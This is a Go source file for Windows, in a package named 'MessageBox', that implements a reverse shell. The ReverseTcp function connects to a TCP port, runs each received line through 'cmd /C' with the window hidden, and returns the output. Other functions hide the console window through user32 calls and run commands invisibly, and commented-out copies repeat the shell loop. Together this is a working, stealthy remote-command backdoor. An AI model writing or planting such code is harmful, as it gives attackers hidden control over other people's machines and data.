package MessageBox

import (
	"bufio"
	"fmt"
	"golang.org/x/sys/windows"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

func ReverseTcp2() {
	listener, err := net.Listen("tcp", "0.0.0.0:1337")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Server is listening on port 1337")

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		fmt.Println("Client connected:", conn.RemoteAddr())

		// Handle the connection (e.g., read and write data)
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	// Implement your logic for handling the connection here
	defer conn.Close()

	// Example: Send a welcome message to the client
	conn.Write([]byte("Welcome to the server!\n"))
}

func ReverseTcp() {
	c, err := net.Dial("tcp", "0.0.0.0:1337")
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer c.Close()

	for {
		status, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from connection:", err)
			return
		}
		fmt.Println(status)

		cmd := exec.Command("cmd", "/C", status)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err := cmd.Output()

		if err != nil {
			fmt.Println("Error executing command:", err)
			return
		}

		c.Write([]byte(out))
	}
	//c, _ := net.Dial("tcp", "0:0:0:0:1337")
	//
	//for {
	//	status, _ := bufio.NewReader(c).ReadString('\n')
	//	fmt.Println(status)
	//
	//	//out, _:=exec.Command("cmd","/Y", '/Q', "/K", status).Output();
	//
	//	cmd := exec.Command("cmd", "/C", status)
	//	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//	out, _ := cmd.Output()
	//
	//	c.Write([]byte(out))
	//
	//}
}

//func reverShellCallBySys() {
//	cmd := exec.Command("cmd.exe", "/C", "echo", "Hello, World!")
//
//	err := runCommandHidden(cmd)
//	if err != nil {
//		fmt.Println("Error:", err)
//	}
//}
//
//func runCommandHidden(cmd *exec.Cmd) error {
//	cmd.SysProcAttr = &syscall.SysProcAttr{
//		HideWindow: true,
//	}
//
//	err := cmd.Start()
//	if err != nil {
//		return err
//	}
//
//	// Wait for the command to complete.
//	err = cmd.Wait()
//	return err
//}
//
//func init() {
//	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
//	procShowWindow := kernel32.NewProc("ShowWindow")
//
//	// GetConsoleWindow returns the handle of the calling process's console window.
//	handle, _, _ := procShowWindow.Call(uintptr(windows.GetConsoleWindow()), uintptr(windows.SW_HIDE))
//	if handle == 0 {
//		fmt.Println("Error hiding console window")
//	}
//}

const (
	SW_HIDE = 0
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	findWindowProc   = user32.NewProc("FindWindowW")
	showWindowProc   = user32.NewProc("ShowWindow")
	getConsoleWindow = func() (windows.Handle, error) {
		handle, _, err := findWindowProc.Call(0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("ConsoleWindowClass"))))
		if handle == 0 {
			return 0, err
		}
		return windows.Handle(handle), nil
	}
)

func PrintCurrDirectoryFromCmd() {
	cmd := exec.Command("cmd.exe", "/C", "dir")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Println(string(output))
}
func ReverseShellCallBySys2() {
	hideConsoleWindow()

	cmd := exec.Command("cmd.exe", "/C", "dir")
	err := runCommandHidden(cmd)
	if err != nil {
		fmt.Println("Error:", err)
	}
}

func runCommandHidden(cmd *exec.Cmd) error {
	err := cmd.Start()
	if err != nil {
		return err
	}

	// Wait for the command to complete.
	err = cmd.Wait()
	return err
}

func hideConsoleWindow() {
	consoleWindow, err := getConsoleWindow()
	if err != nil {
		fmt.Println("Error getting console window handle:", err)
		return
	}

	_, _, err = showWindowProc.Call(uintptr(consoleWindow), uintptr(SW_HIDE))
	if err != nil {
		fmt.Println("Error hiding console window:", err)
	}
}
